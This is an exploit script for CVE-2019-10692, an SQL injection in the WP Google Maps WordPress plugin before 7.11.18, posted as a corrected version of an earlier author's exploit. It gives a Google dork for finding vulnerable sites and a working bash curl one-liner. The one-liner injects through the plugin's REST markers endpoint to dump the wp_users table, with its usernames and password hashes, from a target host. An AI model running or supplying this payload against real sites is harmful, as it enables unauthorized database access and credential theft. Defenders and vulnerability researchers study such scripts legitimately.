# The Exploit posted by Jonatas Fil had some errors that were fixed in the following script


# Exploit Title: WordPress Rest Google Maps Plugin SQL Injection
# Google Dork: inurl:index.php?rest_route=3D/wpgmza/
# Date: 2020-09-09
# Exploit Author: Jonatas Fil
# Vendor Homepage: https://wordpress.org/plugins/wp-google-maps/#developers
# Software Link: https://wordpress.org/plugins/wp-google-maps/
# Version: < 7.11.18
# Tested on: Linux
# CVE : CVE-2019-10692 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2019-10692)
#!/bin/bash

TARGET="10.0.2.10"
curl -k --silent "http://$TARGET/index.php?rest_route=/wpgmza/v1/markers/&filter=%7B%7D&fields=*+from+wp_users+--+-"
